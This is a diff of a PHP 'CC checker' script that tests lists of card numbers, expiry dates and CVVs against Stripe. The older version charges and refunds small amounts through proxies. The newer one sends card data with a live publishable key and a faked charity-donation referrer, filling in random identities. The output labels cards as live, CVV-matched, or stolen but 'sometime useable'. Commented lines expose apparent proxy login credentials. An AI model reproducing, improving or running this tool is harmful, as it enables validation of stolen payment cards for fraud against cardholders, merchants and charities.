@@ -1,6 +1,9 @@
 <?php
 
 
+///////////////////////////////////Made by Checker By 🆃🅷🅴🅹🆇🆂/////
+
+
 error_reporting(0);
 set_time_limit(0);
 error_reporting(0);
@@ -13,40 +16,30 @@ function multiexplode($delimiters, $string)
   $two = explode($delimiters[0], $one);
   return $two;
 }
- $sk = $_GET['sec'];
 $lista = $_GET['lista'];
- $cc = multiexplode(array(":", "|", ""), $lista)[0];
- $mes = multiexplode(array(":", "|", ""), $lista)[1];
-  $ano = multiexplode(array(":", "|", ""), $lista)[2];
- $cvv = multiexplode(array(":", "|", " "), $lista)[3];
+$cc = multiexplode(array(":", "|", ""), $lista)[0];
+$mes = multiexplode(array(":", "|", ""), $lista)[1];
+$ano = multiexplode(array(":", "|", ""), $lista)[2];
+$cvv = multiexplode(array(":", "|", ""), $lista)[3];
+
 function GetStr($string, $start, $end)
 {
   $str = explode($start, $string);
   $str = explode($end, $str[1]);
   return $str[0];
 }
+/*
+function 🆃🅷🅴🅹🆇🆂proxys();
+{ 
+  $Checker By 🆃🅷🅴🅹🆇🆂 = file("proxy.txt");
+  $myproxy = rand(0, sizeof(Checker By 🆃🅷🅴🅹🆇🆂) - 1);
+  $Checker By 🆃🅷🅴🅹🆇🆂 = $Checker By 🆃🅷🅴🅹🆇🆂[$Checker By 🆃🅷🅴🅹🆇🆂];
+  return Checker By 🆃🅷🅴🅹🆇🆂;
+}
+$Checker By 🆃🅷🅴🅹🆇🆂proxies = 🆃🅷🅴🅹🆇🆂proxys();
+*/
 
-///Proxy Function
-function rebootproxys()
-  {
-    $poxySocks = file("proxy.txt");
-    $myproxy = rand(0, sizeof($poxySocks) - 1);
-    $poxySocks = $poxySocks[$myproxy];
-    return $poxySocks;
-  }
-  $poxySocks4 = rebootproxys();
-
-///proxy zone function
-
-$username = 'Put Zone Username Here';
-$password = 'Put Zone Password Here';
-//$port = add port and uncomment ;
-$session = mt_rand();
-$super_proxy = 'zone url here';
-
-
-
-////////////////////////////===[Random User ]
+////////////////////////////===[Randomizing Details Api]
 
 $get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
 preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
@@ -67,257 +60,115 @@ preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
 $postcode = $matches1[1][0];
 
 
-
-//[Auth Section]
-  $ch = curl_init();
-curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-
-  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
-  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
-  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=carolprogay&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
-   $result1 = curl_exec($ch);
-  $s = json_decode($result1, true);
-  
-  $token = $s['id'];
-
-
-
+////////////////////////////===[For Authorizing Cards]
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+/////////========Luminati
+//curl_setopt($curl, CURLOPT_PROXY, 'gate.dc.smartproxy.com:20000');
+//curl_setopt($curl, CURLOPT_PROXYUSERPWD, 'spf8cab748:@mitPogi123');
+////////=========Socks Proxy
+//curl_setopt($ch, CURLOPT_PROXY, $Checker By 🆃🅷🅴🅹🆇🆂proxies);
+curl_setopt($ch, CURLOPT_URL, 'https://donate/');
+curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'authority: api.stripe.com',
+'accept: application/json',
+'accept-encoding: gzip, deflate, br',
+'accept-language: en-US',
+'content-type: application/x-www-form-urlencoded',
+'origin: https://checkout.stripe.com',
+'referer: https://checkout.stripe.com/m/v3/index-933c5ec6e698f8e8c478639778699b64.html?distinct_id=b024204a-cbf9-ca4e-56ba-d8ff3b0608c1',
+'sec-fetch-dest: empty',
+'sec-fetch-mode: cors',
+'sec-fetch-site: same-site',
+'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36'
+ ));
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$name.' '.$last.'&source='.$token.'');
-curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
-$headers = array();
-$headers[] = 'Content-Type: application/x-www-form-urlencoded';
-curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-   $result2 = curl_exec($ch);
-  $cus = json_decode($result2, true);
-$token3 = $cus['id'];
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fanida.org%2Fpages%2Fdonateguestpage%2F1&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]=markojohs%40gmail.com&time_on_page=24997&guid=57e715ea-2245-41ce-a7e6-1c11b7b576f1&muid=6ba0e6ff-83a6-43ab-b4fc-e80fe5f2c70e&sid=c46901ae-6c62-4856-8371-94cc900bd272&key=pk_live_e0UTN6yOJG9h2DnVQetz1MDi');
 
-   // echo $token1 = $cus['id'];
-   //  echo $token1 = $cus['id'];
- $message = trim(strip_tags(getStr($result2,'"message": "','"')));
+$result = curl_exec($ch);
+$message = trim(strip_tags(getStr($result,'"message":"','"'))); 
+////////////////////////////===[Card Response]
 
- $cvvcheck = trim(strip_tags(getStr($result2,'"cvc_check": "','"')));
-
- $declinecode = trim(strip_tags(getStr($result2,'"code": "','"')));
-
-echo "<span>  cvv_check = ".$cvvcheck."</span>";
-
-
-//[Charge Section]
- curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-
-  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
-  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-  curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=50&currency=usd&customer='.$token3.'');
-  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
-  $result3 = curl_exec($ch);
-
-   $char = json_decode($result3, true);
- $chtoken = trim(strip_tags(getStr($result3,'"charge": "','"')));
-   $chargetoken = $char['charge'];
-$decline3 = trim(strip_tags(getStr($result3,'"decline_code": "','"')));
-
-  $ch = curl_init();
-   curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-
-  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/refunds');
-  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-  curl_setopt($ch, CURLOPT_POSTFIELDS, 'charge='.$chtoken.'&amount=50&reason=requested_by_customer');
-  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
- $result4 = curl_exec($ch);
-
-/////////////////////////// [Card Response]  //////////////////////////
-
-if(strpos($result3, '"seller_message": "Payment complete."' )) {
-    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV) 」 </span> </br>';
+if (strpos($result, '"cvc_check": "pass"')) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ⚡ CVV MATCHED ⚡ 🆃🅷🅴🅹🆇🆂</span></br>';
 }
-elseif(strpos($result3,'"cvc_check": "pass"')){
-    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV) 」 </span> </br>';
-
+elseif(strpos($result, "An Internal Error Has Occurred" )) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ⚡ CVC MATCHED ⚡ 🆃🅷🅴🅹🆇🆂</span></br>';
 }
-
-
-elseif(strpos($result1, "generic_decline")) {
-    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined : Generic_Decline 」 </span> </br>';
-    }
-elseif(strpos($result3, "generic_decline" )) {
-    echo '<span class="badge badge-success">#DEAD</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「DECLINE GENERIC 3」 </span> </br>';
+elseif(strpos($result, "Thank You." )) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ⚡ CVC MATCHED ⚡ 🆃🅷🅴🅹🆇🆂</span></br>';
 }
-elseif(strpos($result3, "insufficient_funds" )) {
-    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV - INSUFFICIENT FUND3」 </span> </br>';
+elseif(strpos($result, 'security code is incorrect.' )) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> 🔥 CCN LIVE Checker 🔥 By 🆃🅷🅴🅹🆇🆂 👽</span></br>';
 }
-
-elseif(strpos($result3, "fraudulent" )) {
-    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved fraudulent」 </span> </br>';
+elseif(strpos($result, 'security code is invalid.' )) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> 🔥 CCN LIVE 🔥 Checker By 🆃🅷🅴🅹🆇🆂 👽</span></br>';
 }
-elseif(strpos($resul3, "do_not_honor" )) {
-    echo '<span class="badge badge-success">#DEAD</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「DECLINE DO NOT HONOR 3」 </span> </br>';
-    }
-elseif(strpos($resul2, "do_not_honor" )) {
-    echo '<span class="badge badge-success">#DEAD</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「DECLINE DO NOT HONOR 3」 </span> </br>';
+elseif(strpos($result, 'Your card&#039;s security code is incorrect.' )) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> 🔥 CCN LIVE 🔥 Checker By 🆃🅷🅴🅹🆇🆂 👽</span></br>';
 }
-elseif(strpos($result,"fraudulent")){
-    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Fraudulent Card」 </span> </br>';
-
+elseif (strpos($result, "incorrect_cvc")) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> 🔥 CCN LIVE 🔥 Checker By 🆃🅷🅴🅹🆇🆂 👽</span></br>';
 }
-
-elseif(strpos($result2,'"code": "incorrect_cvc"')){
-    echo '<span class="badge badge-info">#Approved</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CCN 2」 </span> </br>';
+elseif(strpos($result, 'Your card zip code is incorrect.' )) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ⚡ CVC MATCHED ⚡ - Incorrect Zip 🆃🅷🅴🅹🆇🆂</span></br>';
 }
-elseif(strpos($result1,' "code": "invalid_cvc"')){
-    echo '<span class="badge badge-info">#Approved</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CCN 2」 </span> </br>';
+elseif (strpos($result, "stolen_card")) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ⚓ Stolen_Card ⚓ - Sometime Useable Checker By 🆃🅷🅴🅹🆇🆂 🤖</span></br>';
 }
-elseif(strpos($result2,"invalid_account")){
-    echo '<span class="badge badge-danger">#DECLINE</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-danger"> 「invalid_account」 </span> </br>';
-
+elseif (strpos($result, "lost_card")) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ⚓ Lost_Card ⚓ - Sometime Useable Checker By 🆃🅷🅴🅹🆇🆂 🤖</span></br>';
 }
-
-elseif(strpos($result2, "do_not_honor")) {
-    echo '<span class="badge badge-danger">#DECLINE</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「DO NOT HONOR 2」 </span> </br>';
+elseif(strpos($result, 'Your card has insufficient funds.')) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ⚓ Insufficient Funds ⚓ Checker By 🆃🅷🅴🅹🆇🆂 👾</span></br>';
 }
-elseif(strpos($result2, "lost_card" )) {
-    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> GAY「Lost Card」 </span> </br>';
+elseif(strpos($result, 'Your card has expired.')) {
+  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> 🏴‍☠️ Card Expired 🏴‍☠️ Checker By 🆃🅷🅴🅹🆇🆂 👺</span> </br>';
 }
-elseif(strpos($result3, "lost_card" )) {
-    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Lost Card」 </span> </br>';
+elseif (strpos($result, "pickup_card")) {
+  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ⚓ Pickup Card_Card ⚓ - Sometime Useable Checker By 🆃🅷🅴🅹🆇🆂 🤖</span></br>';
 }
-
-elseif(strpos($result2, "stolen_card" )) {
-    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Stolen Card」 </span> </br>';
-    }
-
-elseif(strpos($result3, "stolen_card" )) {
-    echo '<span class="badge badge-success">#decline</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Stolen Card」 </span> </br>';
-
-
+elseif(strpos($result, 'Your card number is incorrect.')) {
+  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> 🔆 Incorrect Card Number 🔆 🆃🅷🅴🅹🆇🆂</span> </br>';
 }
-elseif(strpos($result2, "transaction_not_allowed" )) {
-    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined (transaction_not_allowed)」 </span> </br>';
-    }
-elseif(strpos($result3, "incorrect_cvc" )) {
-    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (CCN3)」 </span> </br>';
-}
-elseif(strpos($result2, "pickup_card" )) {
-    echo '<span class="badge badge-danger">#decline</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Pickup Card (Reported Stolen Or Lost)」 </span> </br>';
-}
-elseif(strpos($result3, "pickup_card" )) {
-    echo '<span class="badge badge-danger">#decline</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Pickup Card (Reported Stolen Or Lost)」 </span> </br>';
-
-}
-elseif(strpos($result2, 'Your card has expired.')) {
-    echo '<span class="badge badge-danger">#Decline</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Expired Card」 </span> </br>';
-}
-elseif(strpos($result3, 'Your card has expired.')) {
-    echo '<span class="badge badge-danger">#decline</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Expired Card」 </span> </br>';
-
-}
-elseif(strpos($result3, '"code": "processing_error"')) {
-    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「PROCESSING ERROR」 </span> </br>';
-    }
-elseif(strpos($result3, ' "message": "Your card number is incorrect."')) {
-    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Your card number is incorrect」 </span> </br>';
-    }
-elseif(strpos($result3, '"decline_code": "service_not_allowed"')) {
-    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「service_not_allowed」 </span> </br>';
-    }
-elseif(strpos($result2, '"code": "processing_error"')) {
-    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> gay「PROCESSING ERROR」 </span> </br>';
-    }
-elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
-    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Your card number is incorrect」 </span> </br>';
-    }
-elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
-    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「service_not_allowed」 </span> </br>';
-
-}
-elseif(strpos($result, "incorrect_number")) {
-    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Incorrect Card Number」 </span> </br>';
-
-
-}elseif(strpos($result1, "do_not_honor")) {
-    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined : Do_Not_Honor」 </span> </br>';
-
-}
-elseif(strpos($result1, 'Your card was declined.')) {
-    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Card Declined」 </span> </br>';
-
-}
-elseif(strpos($result1, "do_not_honor")) {
-    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined : Do_Not_Honor」 </span> </br>';
-    }
-elseif(strpos($result2, "generic_decline")) {
-    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined : Generic_Decline」 </span> </br>';
+ elseif (strpos($result, "incorrect_number")) {
+  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> 🔆 Incorrect Card Number 🔆 🆃🅷🅴🅹🆇🆂</span> </br>';
 }
 elseif(strpos($result, 'Your card was declined.')) {
-    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Card Declined」 </span> </br>';
-
+  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> 🔱 Card Declined 🔱 🆃🅷🅴🅹🆇🆂</span> </br>';
 }
-elseif(strpos($result3,' "decline_code": "do_not_honor"')){
-    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Check : Do_Not_Honor 3」 </span> </br>';
+elseif (strpos($result, "generic_decline")) {
+  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> 🔱 Declined : Generic_Decline 🔱 🆃🅷🅴🅹🆇🆂</span> </br>';
 }
-elseif(strpos($result2,'"cvc_check": "unchecked"')){
-    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Unchecked : Proxy Error @cc_checker」 </span> </br>';
+elseif (strpos($result, "do_not_honor")) {
+  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> 🔱 Declined : Do_Not_Honor 🔱 🆃🅷🅴🅹🆇🆂</span> </br>';
 }
-elseif(strpos($result2,'"cvc_check": "fail"')){
-    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Unchecked : Fail」 </span> </br>';
+elseif (strpos($result, '"cvc_check": "unchecked"')) {
+  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> 🏴‍☠️ Security Code Check : Unchecked [Proxy Dead] 🏴‍☠️ 🆃🅷🅴🅹🆇🆂</span> </br>';
 }
-elseif(strpos($result2,'"cvc_check": "unavailable"')){
-    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Check : Unavailable @cc_checker」 </span> </br>';
+elseif (strpos($result, '"cvc_check": "fail"')) {
+  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> 🏴‍☠️ Security Code Check : Fail 🏴‍☠️ 🆃🅷🅴🅹🆇🆂</span> </br>';
 }
-elseif(strpos($result3,'"cvc_check": "unchecked"')){
-    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Unchecked : Proxy Error 」 </span> </br>';
+elseif (strpos($result, "expired_card")) {
+  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> 🏴‍☠️ Expired Card 🏴‍☠️ 🆃🅷🅴🅹🆇🆂</span> </br>';
 }
-elseif(strpos($result3,'"cvc_check": "fail"')){
-    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Unchecked : Fail 」 </span> </br>';
-}
-
 elseif (strpos($result,'Your card does not support this type of purchase.')) {
-    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Card Doesnt Support Purchase」 </span> </br>';
-    }
-
-elseif(strpos($result2,'"cvc_check": "pass"')){
-    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV) 」 </span> </br>';
-
+  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> 🏴‍☠️ Card Doesnt Support This Purchase 🏴‍☠️ 🆃🅷🅴🅹🆇🆂</span> </br>';
 }
-elseif(strpos($result3, "fraudulent" )) {
-    echo '<span class="badge badge-success">#Declined</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved fraudulent 」 </span> </br>';
-}
-else {
-    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Dead Proxy/Error 」</span> </br>';
-      echo $result1;
-       echo $result2;
-   
-
-      
+ else {
+  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-info"> 🏴‍☠️ Proxy Dead / Error Not Listed 🏴‍☠️ 🆃🅷🅴🅹🆇🆂</span> </br>';
 }
 
-  curl_close($curl);
-  ob_flush();
-  
+curl_close($ch);
+ob_flush();
+//////=========Comment Echo $result If U Want To Hide Site Side Response
+//echo $result 
 
+////////////////////// 1req Checker Made By Checker By 🆃🅷🅴🅹🆇🆂
+////////////////////// Join @ghett000 for more
 ?>
